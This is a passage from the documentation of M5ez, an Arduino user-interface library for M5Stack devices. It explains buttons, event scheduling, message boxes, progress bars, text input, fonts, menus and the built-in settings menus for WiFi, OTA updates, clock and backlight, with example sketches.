not in the middle. (One might use this to signify that the user got to the left edge of something she's navigating, not causing the 'up' function to trigger when she keeps pressing short before realising she's at the left edge.)\nvoid ez.buttons.show(String buttons)\nShows all the buttons you specified, only redrawing the buttons that have changed from the buttons displayed already to prevent flicker. If needed it updates the canvas size to account for a changed number of keyboard rows displayed on the screen.\nvoid ez.buttons.clear(bool wipe = true)\nThis hides the buttons, growing the canvas to cover the area where the buttons were printed. If you set wipe to false, it will not draw background pixels there. (This may help prevent flicker or add a bit of performance if you're about to clear the canvas anyway.)\nString ez.buttons.poll()\nIf you call ez.buttons.poll, it will return the name of the key pressed since you last called it, or the empty string is nothing was pressed. This function is where everyone's M5ez programs will spends most of their time: waiting for the user to make things continue. If your code is waiting in a loop that includes ez.buttons.poll, clock and WiFi signal updating, as well as execution of user-registered functions (see below) will continue.\nString ez.buttons.wait()\nez.buttons.wait does the same thing as ez.buttons.poll() except it does not return if nothing is pressed. If you call it with no arguments, it assumes the buttons have already been drawn with ez.drawButtons. (And if not your program is stuck.)\nString ez.buttons.wait(String buttons)\nYou can specify the keys to be drawn straight into ez.buttons.wait for simple usages. For instance ez.buttons.wait(\"OK\") will display a single \"OK\" on the center button and return \"OK\" when it is pressed. (But given that you are not interested in the return value in this case, you can just specify that as a statement.)\nScheduling tasks within M5ez\nNow that we're dealing with waiting for key presses, this is a good moment to talk about scheduling, yielding and such. As discussed above, a typical program written with M5ez will spend most of its time waiting for keys to be pressed. But some things need to continue to happen while that happening: the clock and the wifi signal indicator need to update, for instance.\nYield\nvoid ez.yield()\nIt could be that your code needs to do things that take a little while. If something takes many seconds, consider putting in an \"abort\" key. But suppose your code is busy and is not using ez.buttons.poll or ez.buttons.wait to check for keys. In that case use ez.yield() in your loop to make sure the clock and WiFi updating (as well as user defined tasks) get executed. ez.yield calls the Arduino yield function, so you do not need to call that separately.\nYour own events\nvoid ez.addEvent(uint16_t (*function)(), uint32_t when = 1)\nvoid ez.removeEvent(uint16_t (*function)())\nWith addevent you can register a function of your own to be executed periodically as part of M5ez's own loop when it is waiting for buttons. This function has to be a function that takes no arguments and returns a 16-bit unsigned integer. Make sure you just specify the name of this function without any brackets. You can optionally specify when to run this function by adding a time in millis(). By default, the function you specify will run immediately.\nThe value returned by your function is the number of milliseconds to wait before calling the function again. So a function that only needs to run once every second would simply return 1000. If your function returns 0, the event is deleted and not executed any further.\nNote: These events are meant for things that need to happen frequently. The next event cannot be more than 65 seconds out as the period between them is a 16-bit unsigned integer. If you use M5ez with ezTime, you can use ezTime's events for things that need to happen with more time between them.\nAs the name implies, ez.removeEvent also removes your function from the loop.\nRedrawing after an event\nvoid ez.redraw()\nSometimes code executed in an event will have changed the contents of the screen. The running menu knows nothing about this, and so when your event ends, it will not refresh the screen. To fix this, you can execute ez.redraw() whenever your event routine has done something on the screen. The menu code will then redraw the screen accordingly.\nChanging the menu from an event\nYou can get a pointer to the current menu from inside your event code by calling M5ez::getCurrentMenu(). Events are not related to any specific menu, so you may get a pointer to different menus at different times durring the program, or even no menu at all (nullptr).\nIf you need to confirm what menu you are dealing with, you can retrieve the title you gave the menu when it was created via ezMenu::getTitle(), which returns a String.\nAn example of a safe usage pattern is:\nezMenu* cur_menu = M5ez::getCurrentMenu();\n// Test to see if menu exists before testing menu's title\nif(cur_menu && cur_menu->getTitle() == \"Desired Menu Title\") {\ncur_menu->setCaption(someItem, someCaption);\n}\nNote: If a menu item uses a simpleFunction or an advancedFunction to display a screen which does not display any menu at all (perhaps only the canvas and buttons are rendered), M5ez::getCurrentMenu() will still return the last active menu. You can modify this menu even when it's not displayed, and the changes will be evident when you return from the simpleFunction or advancedFunction.\nShowing messages with msgBox\nString ez.msgBox(String header,\nString msg, String buttons = \"OK\",\nconst bool blocking = true,\nconst GFXfont* font = MSG_FONT,\nuint16_t color = MSG_COLOR)\nez.msgBox produces a screen that just has your text message centered in the middle. If your message consists of multiple lines, msgBox will word-wrap and justify to the best fit on the screen. You can indicate where to break the lines yourself with a pipe sign (|). The only two arguments you have to provide are the header text and the message to be printed. If you do not specify buttons, ez.msgBox will put a single \"OK\" button in the middle. You can specify buttons in the same way it's done with the button commands seen earlier.\nBy default, msgBox then waits for the user to press any of the keys specified and returns the name of that key. If you want to scan for the keys yourself with ez.buttons.poll() (for instance because there are other things your code need to wait for or check) then you can specify false with blocking, msgBox will then show the message, header and buttons and exit.\nThe font and color options allow you to use something other than the default (theme determined) defaults for the message printed by msgBox. They act as you would expect, see the section on fonts and colors for details.\nezProgressBar\nclass ezProgressBar(String header = \"\", String msg = \"\", String buttons = \"\", const GFXfont* font = MSG_FONT, uint16_t color = MSG_COLOR, uint16_t bar_color = PROGRESSBAR_COLOR, bool show_val = false, uint16_t val_color = PROGRESSBAR_VAL_COLOR)\nIf you want to show progress on a download or something else, use the ezProgressBar class. It behaves very similarly to msgBox, except you need to create a class instance. To create an ezProgressBar instance called pb, one could use:\nezProgressBar pb (\"This is a header\", \"Message, just like with msgBox\", \"Abort\");\nThis will draw header, message, an empty (0 %) progress bar and the specified single \"Abort\" button. Unlike msgBox this will not block by default. In code that executes after this, one would presumably check for the \"Abort\" button with ez.buttons.poll(). To advance the bar, the code would simply call:\npb.value(float val)\nwhere val is a floating point value between 0 and 100. Check out the Over-The-Air https update example to see how the ezProgressBar object is used there. (You'll see that the ez.wifi.update() software update function accepts a pointer to an ezProgressBar instance to show its progress.)\n3-button text input\nString ez.textInput(String header = \"\", String defaultText = \"\")\nThis function will provide a text-entry field, pre-filled with defaultText if specified. The user can then select a group of letter and then press the letter using the short and long keypresses and multi-key presses as discussed above in the \"Buttons\" chapter. By using this method, the lower case letters can be reached in two presses, upper case letters in three. If you are in shifted or numeric mode and press lock, the keyboard will return there instead of to lower case after each successful key. Once the user presses \"done\" (buttons A and C together), the function returns the entered text.\nAdvanced users can make their own keyboard definitions by looking at the _keydefs keyboard definition that is part of the default theme. As you can see there are multiple lines, each holding a key definition string like we have gotten to know them by now. Any key whose name is \"KB\" followed by a number causes nothing to be added to the input but the buttons in that line of the definitions to be printed instead. A key whose name is LCK: optionally followed by a string means that if it is pressed the current keyboard is what the user comes back to after a line is entered. Pressing a key whose name is \"Back\" returns to that keyboard as well. The string is used to denote the name of that keyboard in the on-screen capslock/numlock message.\nFACES keyboard support\nString ez.faces.poll()\nbool ez.faces.on()\nM5ez supports the M5 FACES keyboard: simply set the keyboard to \"attached\" in the M5ez settings menu. When you do, you will be able to use the ez.faces.poll function to get the last key pressed on the keyboard. The textInput and textBox functions will then also look for keys from that keyboard, and start with different key definitions for the M5Stack's own buttons. ez.faces.on() can be used to see if the keyboard is set to \"attached\" in the menu.\nComposing or viewing longer texts: textBox\nString ez.textBox(String header = \"\",\nString text = \"\", bool readonly = false,\nString buttons = \"up#Done#down\",\nconst GFXfont* font = TB_FONT, uint16_t color = TB_COLOR)\nThis will word-wrap and display the string in text (up to 32 kB), allowing the user to page through it. Ideal for LoRa or SMS messages, short mails or whatever else. If a FACES keyboard is attached and readonly is false, the user can edit the text: a cursor appears, which can be moved with the arrow keys on the FACES keyboard. TB_FONT and TB_COLOR are the defaults from the theme, but they can be overridden by supplying a font and/or a color directly.\nFonts\nvoid ez.setFont(const GFXfont* font)\nint16_t ez.fontHeight()\nJust like when using the m5.lcd.setFreeFont function directly, you can specify the FreeFont fonts to ez.setFont with a pointer to where they are in flash. M5ez makes it possible to do the same but also use the built-in \"pre-FreeFont\" fonts that are available. Normally, you would have to pass these as a numeric parameter to m5.lcd.setTextFont. M5ez provides a set of \"fake pointers\" that are treated specially to make this happen, but they can only be used by M5ez functions, not with any of the m5.lcd functions.\nThe fontHeight without arguments returns the height of the current font - FreeFont or otherwise - in pixels, without needing to specify which text font like in the m5.lcd version.\nWhat that all means is that without adding any fonts of your own, you can specify the following fonts:\nFreeFonts from the Adafruit library\n&TomThumb\n&FreeMono9pt7b\n&FreeMono12pt7b\n&FreeMono18pt7b\n&FreeMono24pt7b\n&FreeMonoBold9pt7b\n&FreeMonoBold12pt7b\n&FreeMonoBold18pt7b\n&FreeMonoBold24pt7b\n&FreeMonoOblique9pt7b\n&FreeMonoOblique12pt7b\n&FreeMonoOblique18pt7b\n&FreeMonoOblique24pt7b\n&FreeMonoBoldOblique9pt7b\n&FreeMonoBoldOblique12pt7b\n&FreeMonoBoldOblique18pt7b\n&FreeMonoBoldOblique24pt7b\n&FreeSans9pt7b\n&FreeSans12pt7b\n&FreeSans18pt7b\n&FreeSans24pt7b\n&FreeSansBold9pt7b\n&FreeSansBold12pt7b\n&FreeSansBold18pt7b\n&FreeSansBold24pt7b\n&FreeSansOblique9pt7b\n&FreeSansOblique12pt7b\n&FreeSansOblique18pt7b\n&FreeSansOblique24pt7b\n&FreeSansBoldOblique9pt7b\n&FreeSansBoldOblique12pt7b\n&FreeSansBoldOblique18pt7b\n&FreeSansBoldOblique24pt7b\n&FreeSerif9pt7b\n&FreeSerif12pt7b\n&FreeSerif18pt7b\n&FreeSerif24pt7b\n&FreeSerifItalic9pt7b\n&FreeSerifItalic12pt7b\n&FreeSerifItalic18pt7b\n&FreeSerifItalic24pt7b\n&FreeSerifBold9pt7b\n&FreeSerifBold12pt7b\n&FreeSerifBold18pt7b\n&FreeSerifBold24pt7b\n&FreeSerifBoldItalic9pt7b\n&FreeSerifBoldItalic12pt7b\n&FreeSerifBoldItalic18pt7b\n&FreeSerifBoldItalic24pt7b\nFreeFonts included by the M5Stack driver\n&Orbitron_Light_24\n&Orbitron_Light_32\n&Roboto_Thin_24\n&Satisfy_24\n&Yellowtail_32\nOlder fonts available only through M5ez\nmono6x8\nsans16\nsans26\nnumonly48\nnumonly7seg48\nnumonly75\nmono12x16\nsans32\nsans52\nnumonly96\nnumonly7seg96\nnumonly150\nNote that these fonts need to be specified without the & in front, and that the second batch consists of scaled up versions of the first batch, but they're nice and big and they still might be quite useful.\nUsing your own fonts\nYou can convert your own TrueType fonts to font files that can be included in your project and used on the M5Stack. As a separate project, I wrote a graphical converter where you can test the fonts on a virtual M5Stack display before converting. It's an online tool, so all of the action takes place online and in your web browser. Click here (or on the image below) to use it. Everything you need to know to use it is on that page also.\nMenus\nMenus are a way of letting users choose between different options, usually to influence program flow. With ezMenu, you can create a menu, give it some options and run it for the user to choose. An ezMenu can display as a list of options, allowing the user to go up and down the list (possibly scrolling off the screen). Or it can be a set of full-screen (or really full-canvas) images, with the user scrolling left and right before choosing one. They are both instances of the ezMenu object\nLet's start with text menus\nTo create a menu we create an instance of the ezMenu object. By having each menu be it's own instance of that object, we can store information that will disappear from RAM if a submenu closes and we can return to higher menus which have kept their state. let's start with a complete sketch for a very simple text menu:\n#include <M5Stack.h>\n#include <M5ez.h>\nvoid setup() {\nez.begin();\n}\nvoid loop() {\nezMenu myMenu;\nmyMenu.addItem(\"Option 1\", mainmenu_one);\nmyMenu.addItem(\"Option 2\", mainmenu_two);\nmyMenu.addItem(\"Option 3\");\nmyMenu.run();\n}\nvoid mainmenu_one() {\nez.msgBox(\"\", \"You pressed one\");\n}\nvoid mainmenu_two() {\nSerial.println(\"Number two was pressed\");\n}\nAs you can see we define our menu named myMenu and we added three items with names and optional functions to jump to. We have inserted this in the Arduino loop function, but we might as well have stuck it in setup, because this menu will keep running forever: the myMenu.run() statement will never complete. It will display the menu, call and wait for the appropriate function if the user selects a menu option, rinse and repeat.\nWhich is all fine and well if that's our main menu, but it doesn't work if if the menu is a submenu. This is why the yourMenu.run() function exits if the user selects a menu item named \"Exit\", \"Back\" or \"Done\". This may be with a capitalized first letter or all lower case. (Menu items are just like buttons in that they have a name and a caption. If you add an item with `yourMenu.addItem(\"Exit | Go back to main menu\"), it will display the longer text, but still cause the menu to exit.\nLet's see our sketch again, this time with a submenu added:\n#include <M5Stack.h>\n#include <M5ez.h>\nvoid setup() {\nez.begin();\n}\nvoid loop() {\nezMenu myMenu(\"Main menu\");\nmyMenu.addItem(\"Item 1\", mainmenu_one);\nmyMenu.addItem(\"Item 2\", mainmenu_two);\nmyMenu.addItem(\"Item 3\", mainmenu_three);\nmyMenu.run();\n}\nvoid mainmenu_one() {\nez.msgBox(\"\", \"You pressed one\");\n}\nvoid mainmenu_two() {\nSerial.println(\"Number two was pressed\");\n}\nvoid mainmenu_three() {\nezMenu subMenu(\"Submenu\");\nsubMenu.addItem(\"Item A\");\nsubMenu.addItem(\"Item B\");\nsubMenu.addItem(\"Item C\");\nsubMenu.addItem(\"Back | Back to main menu\");\nsubMenu.run();\n}\nAs you can see, the submenu called subMenu has three items that do nothing because we did not supply functions, as well as a fourth item called \"Back\" (which displays \"Back to main menu\"), which, when selected, causes subMenu.run() to exit, which in turn causes mainmenu_three to exit which brings us back to the main menu. The main menu will sit there as if we never left, still showing \"Item 3\" highlighted. The subMenu object instance meanwhile has gone out of scope when the function exited, neatly cleaning up the RAM it used.\nDid you notice we're now providing brackets and an argument when we create the menu. That is the header above our menu.\n.runOnce()\nUntil now we have considered menus that run all by themselves, unless they exit when a user selects an option named \"Back\", \"Exit\" or \"Done\". But you can also call yourMenu.runOnce() which will exit every time a user selects an option (but still after executing the supplied function or functions). Take a look at this:\n#include <M5Stack.h>\n#include <M5ez.h>\nvoid setup() {\nez.begin();\n}\nvoid loop() {\nezMenu myMenu(\"Main menu\");\nmyMenu.addItem(\"Item 1\");\nmyMenu.addItem(\"Item 2\");\nmyMenu.addItem(\"Item 3\");\nmyMenu.runOnce();\nif (myMenu.pickName() == \"Item 1\") {\nez.msgBox(\"\", \"You pressed one\");\n}\nif (myMenu.pickName() == \"Item 2\") {\nSerial.println(\"Number two was pressed\");\n}\n}\nThis does exactly the same as the first example we started with. Note that .runOnce() returns an integer that holds the position of the item selected. So the following would be yet another way to get the same functionality:\n#include <M5Stack.h>\n#include <M5ez.h>\nvoid setup() {\nez.begin();\n}\nvoid loop() {\nezMenu myMenu(\"Main menu\");\nmyMenu.addItem(\"Item 1\");\nmyMenu.addItem(\"Item 2\");\nmyMenu.addItem(\"Item 3\");\nwhile (true) {\nswitch (myMenu.runOnce()) {\ncase 1:\nez.msgBox(\"\", \"You pressed one\");\nbreak;\ncase 2:\nSerial.println(\"Number two was pressed\");\nbreak;\n}\n}\n}\nImage menus\nYou can include jpg files in the flash by creating a special .h file that holds byte arrays encoding the bytes in the JPG file. If you #include this file in your program and then add at least one menu items with addItem(picture1, \"Item 1\") where picture1 is the name of the JPG array in the .h file, the menu's .run() and .runOnce() functions will change behavior: they will show an image menu instead of a text menu.\nYou can also include the images to be shown as files, either on an SD card or on the special SPIFFS partition in the flash memory of the M5Stack.\nThe code in the demo application to show the picture menu looks as follows:\nvoid mainmenu_image() {\nezMenu images;\n...\nimages.addItem(sysinfo_jpg, \"System Information\", sysInfo);\nimages.addItem(wifi_jpg, \"WiFi Settings\", mainmenu_wifi);\nimages.addItem(about_jpg, \"About M5ez\", aboutM5ez);\nimages.addItem(sleep_jpg, \"Power Off\", powerOff);\nimages.addItem(return_jpg, \"Back\");\nimages.run();\n}\nAs you can see we simply call addItem() with the name of the byte array that holds the encoded JPG file, a name to be used as a caption on the image and a function to be executed.\nMenus: all the functions documented\nAs you will see in the function documentation below, there is much more you can do with menus, like adding and deleting items on the fly. And if you draw different buttons, it's important to know that any button not named \"up\" or \"down\" selects the currently highlighted item. You might, for instance, create a button or button combination named \"info\" that provides more information about the current selection. There is also an advanced function you can pass that has access to more data and that can cause the menu to exit.\nezMenu yourMenu(String header)\nezMenu yourMenu\nIf you issue on of these statements, you are creating an instance of the ezMenu object called \"yourMenu\". This will allow you to reference it when you start adding items to it, change various properties of it. Eventually your code will run the menu, which means it will display on the screen. \"yourMenu\" should of course be replaced by any name of your choice, but we'll use it in this text to show all the functions that apply to menus. These functions should be called with the name of the menu followed by a dot in front of them, as they are \"member functions\" of the ezMenu object.\nbool addItem(String nameAndCaption,\nvoid (*simpleFunction)() = NULL,\nbool (*advancedFunction)(ezMenu* callingMenu) = NULL,\nvoid (*drawFunction)(ezMenu* callingMenu, int16_t x, int16_t y, int16_t w, int16_t h) = NULL)\nbool addItem(const char *image, String nameAndCaption,\nvoid (*simpleFunction)() = NULL,\nbool (*advancedFunction)(ezMenu* callingMenu) = NULL,\nvoid (*drawFunction)(ezMenu* callingMenu, int16_t x, int16_t y, int16_t w, int16_t h) = NULL)\nbool addItem(fs::FS &fs, String path, String nameAndCaption,\nvoid (*simpleFunction)() = NULL,\nbool (*advancedFunction)(ezMenu* callingMenu) = NULL,\nvoid (*drawFunction)(ezMenu* callingMenu, int16_t x, int16_t y, int16_t w, int16_t h) = NULL)\nAdds items to a menu. The first form adds a text only item, the second and third forms make image menus. You can either supply a pointer to the image which is encoded as a byte array in a special .h file that you should have included, or a file system reference and a path for a file stored on SD of SPIFFS.\nIn the latter case your sketch must do either #include <SPIFFS.h> and SPIFFS.begin() or #include <SD.h>' and 'SD.begin(), and provide both the SD or SPIFFS object reference as well as the path to the file. The \"ImagesSPIFFSorSD\" example shows how to use this feature. Images from program flash, SPIFFS and SD-card can be freely mixed in the same menu.\nThe simpleFunction should be the name of a void function without parameters that will simply be executed as the menu item is picked. You supply the name of the function without the brackets here, as you are passing a pointer to the function and not the output of it.\nThe string named nameAndCaption can (as the name implies) hold both a name and a caption. If you don't do anything special they are set to the same string you supply. But if you pass somename | Some caption, the name is the part before the first pipe sign (|), the caption is everything after it. (Spaced around the pipe sign are removed.)\nThe name is what is returned when you call yourMenu.pickName() after the menu has ran, and you can also supply it as an argument to deleteItem() (see below). The caption is what is printed, either in the item's line in the menu or as a caption with the image in an image menu. The caption is also returned by yourMenu.pickCaption().\nIf you put a tab character (Represented by \\t) in the caption of a menu item, the text to the left of the tab will be left-aligned to the left of the menu item, and the text to the right of it will be right-aligned to the right of the item. You can see this feature in use in M5ez's settings menu where the part on the right generally represents the actual state of a setting.\nIf an item is named \"Back\", \"Exit\" or \"Done\" (either with first letter capitalized all all lower case), the menu will exit is this item is picked, unless an advancedFunction is supplied (see below). Note that while it has to be named one of these three things, it can be captioned something completely different.\nIf you want your code to have more access to what just happened in the menu, you can supply an advancedFunction pointer. This way you can have a function that has access to all the member functions of the menu that called it, and it can determine whether the menu exits or not by returning true (keep running) or false (exit).\nbool myAdvancedFunction(ezMenu* callingMenu) {\nSerial.print( callingMenu->pickCaption() )\nIf (msgBox(\"Wow...\", \"Are you sure?\", \"yes##no\") == \"yes\") return false;\nreturn true;\n}\nThis function will print the caption printed on the menu item that was picked, and it will ask the user whether she really wants to exit the menu, causing the calling menu to exit by returning false if she presses yes. Note that items called \"Back\", \"Exit\" or \"Done\" do not cause the menu to exit immediately if they have an advancedFunction set: in that case the decision is left to the advancedFunction.\nIf you want your code to have access to the way the menus are drawn, you can supply an drawFunction pointer. The coordinates x, y, w (width) and h (height) define the rectangle where the menu is located.\nvoid myDrawFunction(ezMenu* callingMenu, int16_t x, int16_t y, int16_t w, int16_t h){\nm5.lcd.setTextDatum(CL_DATUM);\nm5.lcd.setTextColor(ez.theme->menu_item_color);\n// New callingMenu aspect\nm5.lcd.fillRoundRect(x, y, w, h, 1, TFT_RED);\nm5.lcd.drawString(\"New text\",x + ez.theme->menu_item_hmargin,y + ez.fontHeight() / 2 - 2);\n}\nNote that to address member functions of the calling menu in this function we need to use '->' instead of '.'. That's because we were passed a pointer to the instance, not an instance itself, but don't worry too much if you don't understand that.\nbool deleteItem(int16_t index)\nbool deleteItem(String name)\nThe first form deletes the menu item at the position indicated, starting with 1 for the first menu item. The second form allows you to delete a menu item by name. Note that this will only delete the first menu item with that name. deleteItem will return true if it works, false if the name or index do not point to a valid menu item.\nbool setCaption(int16_t index, String caption)\nbool setCaption(String name, String caption)\nAs the name implies, changes the caption (but not the name) of the item specified either by position or by name.\nint16_t getItemNum(String name)\nReturns the index in the menu (starting at 1) of the first menu item with the specified name, or 0 if no item with that name exists.\nvoid buttons(String bttns)\nThis allows you to pass your own buttons to the function, using the format discussed in the chapter on buttons earlier in the documentation. By default, a text menu has the buttons up # select # down defined while an image menu has left # select # right. You can provide your own button layout, moving the buttons or adding functions for long presses or key combinations. Note that there is nothing special about the word \"Select\". Any button not named \"up\", \"down\", \"left\" or \"right\" is used to pick the current item, and you can use either an advancedFunction or .runOnce() and then a call to .pickButton() to figure out which key was pressed.\nButtons captioned \"up\", \"down\", \"left\" or \"right\" are displayed with a triangular arrow in the corresponding direction instead of that word. Buttons named \"Back\", \"Exit\" or \"Done\" cause the menu to exit. Note that menus without buttons named \"up and \"down\" (text menus) or \"left\" and \"right\" (image menus) become impossible to navigate.\nButtons named \"first\" and \"last\" ump to the first or last item of the menu respectively.\nvoid upOnFirst(String nameAndCaption)\nvoid leftOnFirst(String nameAndCaption)\nvoid downOnLast(String nameAndCaption)\nvoid rightOnLast(String nameAndCaption)\nThese functions allow you to replace the navigation button that would navigate off the menu with something else. Normally this button would just disappear. You can make menu rotate (like the main menu in the demo app) like this:\nmain.upOnFirst(\"last|up\");\nmain.downOnLast(\"first|down\");\nNote that the \"first\" and \"last\" are button names with special functions, and \"up\" and \"down\" are captions with special functions (they are replaced by triangle arrows). The first two and last two functions are actually synonyms: they do they same thing, it's just clearer to use the second form when creating an image menu (which is horizontal).\nvoid txtFont(const GFXfont* font)\nvoid txtBig()\nvoid txtSmall()\nThese apply to text menus only. You can set the font. The theme can supply a default big and small menu font, which can be set by simply calling .txtBig() or .txtSmall() on a menu. In the default theme, the big menu can display 6 items at a time when a header and a single row of button labels is displayed, a small menu displays eight items at a time. You can set your own font with txtFont or create a new theme with different defaults.\nvoid setSortFunction(bool (*sortFunction)(const char* s1, const char* s2))\nOrdinarily, menu items are displayed in the order in which they are added. However, if you are building a menu from data which you have no control over, such as a list of file names from an SD card, a sort function will ensure that the names are displayed in a specific order. You may define a sort function that takes two const char*'s and returns true when the second is greater than the first, or use one of the eight built-in sorting functions.\nbool ascendingCaseSensitive(const char* s1, const char* s2) {\nreturn 0 > strcmp(s1, s2);\n}\n...\nmenu.setSortFunction(ascendingCaseSensitive);\nOnce set, the menu is automatically kept sorted. All calls to addItem result in a sorted menu without further interaction. If setSortFunction is called after the menu has been populated, it's immediately resorted and maintained in its new order as items are added and deleted.\nNote that if your menus use Captions as well as Names, sorting is a bit more complicated. A set of functions is provided for sorting text in most typical manners:\nFunction Purpose\nezMenu::sort_asc_name_cs Sort ascending by menu name, case sensitive\nezMenu::sort_asc_name_ci Sort ascending by menu name, case insensitive\nezMenu::sort_dsc_name_cs Sort descending by menu name, case sensitive\nezMenu::sort_dsc_name_ci Sort descending by menu name, case insensitive\nezMenu::sort_asc_caption_cs Sort ascending by menu caption or name if no caption, case sensitive\nezMenu::sort_asc_caption_ci Sort ascending by menu caption or name if no caption, incase sensitive\nezMenu::sort_dsc_caption_cs Sort descending by menu caption or name if no caption, case sensitive\nezMenu::sort_dsc_caption_ci Sort descending by menu caption or name if no caption, case insensitive\nSee the example program SortedMenus for typical usage.\nThen there are some functions that only apply to image menus\nvoid imgBackground(uint16_t color)\nThis sets a temporary background color different from the background from the theme or set manually with ez.background. This is so that background between the buttons can match the background of the images displayed. The background will return to its previous setting when the menu exits or runs any of the functions supplied with addItem.\nvoid imgFromTop(int16_t offset)\nThe offset in pixels from canvasTop() where the top of the image is rendered.\nvoid imgCaptionFont(const GFXfont* font)\nvoid imgCaptionLocation(uint8_t datum)\nvoid imgCaptionColor(uint16_t color)\nvoid imgCaptionMargins(int16_t hmargin, int16_t vmargin)\nThese settings allow for the menu item caption to be printed somewhere on the canvas. The font and color options are obvious, the location is one of\nleft middle right\ntop TL_DATUM TC_DATUM TR_DATUM\nmiddle ML_DATUM MC_DATUM MR_DATUM\nbottom BL_DATUM BC_DATUM BR_DATUM\nand the margins specify how far away from the edges of the canvas the caption is printed. The default is for no caption to be printed, you must specify all these options if you want captions.\nint16_t runOnce()\nIf you execute yourMenu.runOnce(), the menu will show and the user can interact with it until an item is picked. Then the function returns the index of the picked item (starting at one). The menu can also 'exit' (which is not the same as the .runOnce() function exiting, which happens when an item is picked.\nIf the user picks an item named \"Back\", \"Exit\" or \"Done\" that does not have an advancedFunction passed.\nIf the user picks any item using a button named \"Back\", \"Exit\" or \"Done\".\nif the advancedFunction that was ran for a picked item returned false.\nIn all of the above cases, .runOnce will return 0. The index of the item picked will still be returned with .pick(), see below.\nvoid run()\nThe internal code for .run() is very simple:\nvoid ezMenu::run() {\nwhile (runOnce()) {}\n}\nIn other words: all it does is just call .runOnce() on your menu until it exits for any of the reasons listed above. If your menu is the main menu of the program, you would simply not supply any items or buttons called \"Exit\", \"Back\" or \"Done\" and have no advancedFunctions ever return false. This will cause the menu to run forever.\nint16_t pick()\nString pickName()\nString pickCaption()\nString pickButton()\nThese functions will show the position, name and caption of the picked item. They are useful after your menu has been ran once with .runOnce or in an advancedFunction (see under addItem above).\nSettings\nM5ez comes with a number of built-in settings menus. The settings are saved to flash in the M5ez section of the ESP32 NVS facility (using the Arduino Preferences library). All you need to do is create one menu item that points to ez.settings.menu and all settings will be available. By commenting out certain compiler defines, menu items (and all code associated with them) can be disabled. The various menus can also be accessed directly. Here's a quick table of the menus, their #define keyword, and their direct access function.\nMenu #define function\nWifi menu M5EZ_WIFI ez.wifi.menu\nBattery menu M5EZ_BATTERY ez.battery.menu\nClock menu M5EZ_CLOCK ez.clock.menu\nBacklight brightness M5EZ_BACKLIGHT ez.backlight.menu\nFACES keyboard M5EZ_FACES ez.faces.menu\nTheme chooser n/a ez.theme.menu\nWifi\nThe wifi menu allows the user to connect to an Access Point. The user can also turn on and off the \"autoconnect\" feature. With this feature on, M5EZ will behave like most smartphones and automatically connect to any Access Point which has been added to the autoconnect list when it was joined.\nNote that this doesn't use the WiFi.setAutoConnect and WiFi.setAutoReconnect functions of the ESP32 WiFi library: they can only connect to one access point. Instead M5ez has it's own logic for connecting, saving the ssid and password of networks you want to automatically connect to in flash.\nBelow you can see how to access the stored networks as well as the stored \"on/off\" toggle for the autoconnect feature from code. You probably won't need this as ez.wifi.menu lets the user manage all of this. Note that if you do make any changes, you have to call ez.wifi.writeFlash() when you are done to save them to flash.\nstd::vector<WifiNetwork_t> networks\nez.wifi.networks is a vector (think of it as an array), that holds all the stored networks after M5ez boots (or ez.wifi.readFlash() is executed). Here's a code example to print all the SSIDs and their passwords to the M5ez canvas.\nfor (int8_t n = 0; n < ez.wifi.networks.size(); n++) {\nez.canvas.print(ez.wifi.networks[n].SSID);\nez.canvas.print(\": \");\nez.canvas.println(ez.wifi.networks[n].key);\n}\nvoid ez.wifi.add(String ssid, String key)\nbool ez.wifi.remove(int8_t index)\nbool ez.wifi.remove(String ssid)\nAdds or removes a network. the index is the index in te networks array above.\nint8_t indexForSSID(String ssid)\nCan be used to find the index for a named SSID. -1 is returned if the name is not found.\nThe weird Wifi ghost button problem\nwhen you connect to Wifi, on some M5Stack devices, you may notice a strange quirk of the M5Stack hardware, or possibly of the ESP32 chip. When you are connected, the left button is getting ghost clicks. If this happens to you when you are on Wifi, you will need to do the following to fix it.\nNavigate to the Arduino libraries directory, and then from there to M5Stack/src/utility/Button.cpp. In that file (around line 60) find\npinVal = digitalRead(_pin);\nand replace that line with:\n// The digitalRead of the button pin is commented out below.\n// The two lines below fix an issue where BtnA gets spurious presses if the\n// Wifi is active. (The second line fixes it, the first remediates resulting\n// speaker noise.) For details: https://github.com/m5stack/M5Stack/issues/52\n// pinVal = digitalRead(_pin);\ndacWrite(25, 0);\npinVal = analogRead(_pin);\nNow recompile and the problem is gone. It does mean that you cannot use the speaker while ez.buttons.poll() is checking for button presses.\nOver-The-Air (OTA) updates via https\nYou might deploy hardware that needs updates but that you don't want to hook up via USB every time. But you will want this upload mechanism to offer some security against attackers that could otherwise compromise large numbers of internet-connected IoT devices. M5ez allows you to boot from a compiled binary file that is downloaded from the internet over https.\nbool ez.wifi.update(String url, const char* root_cert, ezProgressBar* pb = NULL)\nString ez.wifi.updateError()\nTakes a URL and a root certificate. A shell script called get_cert is provided in the /tools directory of this repository to get the right (non-forwarded) URL and create an include file to provide the correct certificate. The optional third argument is a pointer to the ezProgressBar instance that will show the progress of the firmware download. It must be provided with a leading ampersand.\nez.wifi.update returns true if the file is downloaded and everything is set up. The next reboot - which can be forced with ESP.restart() - will start the new binary. If ez.wifi.update returns false, you can use ez.wifi.updateError() to return a String with a human-readable error message. (The way the https stream data is handled by the underlying ESP32 Update library does not seem terribly robust: stream timeouts happen, even on otherwise good internet connections.)\nThe README.rd file of the OTA_https sample sketch provides a step-by-step recipe that describes how to determine the URL and get the certificate using get_cert.\nBLE\nBLE, short for Bluetooth Low Energy. Is intended to provide considerably reduced power consumption and cost while maintaining a similar communication range. We implemented a device manager, so you can just focus on communicate with the target device. You can access it's interface from ez.ble , and can get access to connected devices from ez.ble.getClient function.\nBattery\nThe battery menu allows you to selectively show a battery level icon in the header bar. But due to hardware limitations it can only show four different battery levels. You can access its menu from ez.battery.menu. The battery level icon is animated while charging via USB.\nClock\nIf M5ez is compiled with M5EZ_CLOCK (which it is by default), it will be set up to display a clock in the header bar at the top of the screen. By default this clock displays time in a 24 hour format, but this can be changed in the clock menu, which is also accessible directly via ez.clock.menu.\nThe first time M5ez goes online, it will try to look up the timezone using the GeoIP country of the IP address you are connecting to the timezone server from. If this lookup fails or if you are in a country that spans multiple timezones this lookup will fail and an official timezone name will have to be set manually in the menu. (Timezone names are of the from Continent/Some_City, see here for a list of timezone names. Note that the name of the timezone has to be entered in the correct case.\nIf you use M5ez with on-screen clock, your code can also use all the other features of ezTime, my full-featured general purpose Arduino time library.\nBacklight\nYou can set the brightness of the LCD backlight LEDs here. The menu is also directly accessible via ez.backlight.menu.\nFACES keyboard\nHere you can set whether or not you have a FACES keyboard attached. I would have preferred to detect the keyboard automatically, but that's not easy, so it's solved with a settings 